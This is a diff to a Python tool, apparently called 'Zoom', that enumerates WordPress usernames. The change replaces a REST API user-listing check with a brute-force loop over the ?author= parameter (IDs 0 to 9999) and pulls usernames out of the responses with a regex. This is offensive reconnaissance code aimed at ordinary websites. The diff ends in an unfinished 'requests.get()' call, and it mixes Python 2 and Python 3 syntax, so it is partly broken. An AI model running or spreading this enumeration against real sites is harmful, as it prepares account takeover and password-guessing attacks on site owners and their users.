@@ -1,7 +1,7 @@
 # Required modules
 import argparse
 import requests
-import json
+import re
 
 # Just some colors and shit bro
 white = '\033[97m'
@@ -24,20 +24,34 @@ print ('''%s  ____
   / /_/ %s_ \/ _%s \/    \\
  /___/\___%s/\%s___/_/_/_/%s\n''' % (yellow, white, yellow, white, yellow, end))
 
+usernames = [] # List for storing found usernames
+
+def manual(url):
+	print '%s Scan Started' % run
+	for number in range(0, 9999):
+		response = requests.get(url + '/?d3v=x&author=' + str(number)).text # Makes request to webpage
+		match = re.search(r'/author/[^<]*/', response) # Regular expression to extract username
+		if match:
+			username = match.group().split('/author/')[1][:-4] # Taking what we need from the regex match
+			print username.replace('/feed', '') # Print the username without '/feed', if present
+			usernames.append(username) # Appending the username to usernames list
+		else:
+			if len(usernames) - number > 20: # A simple logic to be on the safe side
+				if len(usernames) > 1:
+					print '%s Looks like Zoom has found all the users. Exiting...' % info
+					quit()
+				else:
+					print '%s Looks like there\'s some security measure in place. Exiting...' % bad
+					quit()
+
 if args.url:
 	url = args.url # args.url contains value of -u option
 	if 'http' not in url:
-		url = 'https://' + url
-	response = requests.get('%s/wp-json/wp/v2/users' % url).text
-	if 'Sorry, you are not allowed to list users.' in response:
-		print (' %s Not vulnerable' % bad)
-	else:
-		data = json.loads(response)
-		print (' %s+--------------------------+-------------------------------+%s' % (yellow, end))
-		print (' %s| Display Name             | Username                      |%s' % (yellow, end))
-		print (' %s+--------------------------+-------------------------------+%s' % (yellow, end))
-		for key in data:
-			print (' %s|%s %-25s%s|%s %-30s%s|%s' % (yellow, end, key['name'], yellow, end, key['slug'], yellow, end))
-		print (' %s+--------------------------+-------------------------------+%s' % (yellow, end))
+		url = 'http://' + url
+	manual(url)
 else:
 	parser.print_help()
+
+if usernames:
+	for username in usernames:
+		requests.get()
